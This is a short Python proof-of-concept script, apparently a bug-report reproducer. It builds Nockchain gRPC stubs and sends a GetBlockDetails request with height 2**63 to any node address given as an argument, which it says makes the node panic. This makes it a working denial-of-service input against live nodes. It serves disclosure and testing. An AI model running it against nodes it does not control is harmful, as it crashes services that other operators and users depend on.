#!/usr/bin/env python3
# reproduce_panic.py - Minimal DIRECT_MAX panic reproducer
import grpc
from grpc_tools import protoc
import subprocess, sys, tempfile, os

# Generate protos and trigger panic
PROTO_DIR = "nockchain/crates/nockapp-grpc-proto/proto"
out = tempfile.mkdtemp()
for p in ["nockchain/common/v1/primitives.proto", "nockchain/common/v2/blockchain.proto",
          "nockchain/public/v2/nockchain.proto", "nockchain/common/v1/blockchain.proto",
          "nockchain/common/v1/pagination.proto"]:
    subprocess.run([sys.executable, "-m", "grpc_tools.protoc", f"-I{PROTO_DIR}",
                   f"--python_out={out}", f"--grpc_python_out={out}", f"{PROTO_DIR}/{p}"],
                   capture_output=True)
for pkg in ["nockchain", "nockchain/common", "nockchain/common/v1", "nockchain/common/v2",
            "nockchain/public", "nockchain/public/v2"]:
    os.makedirs(f"{out}/{pkg}", exist_ok=True)
    open(f"{out}/{pkg}/__init__.py", 'w').close()

sys.path.insert(0, out)
from nockchain.public.v2 import nockchain_pb2, nockchain_pb2_grpc

ch = grpc.insecure_channel(sys.argv[1])
stub = nockchain_pb2_grpc.NockchainBlockServiceStub(ch)
try:
    stub.GetBlockDetails(nockchain_pb2.GetBlockDetailsRequest(height=2**63))
except grpc.RpcError as e:
    print(f"Result: {e.code()} - triggers panic in noun.rs:220")

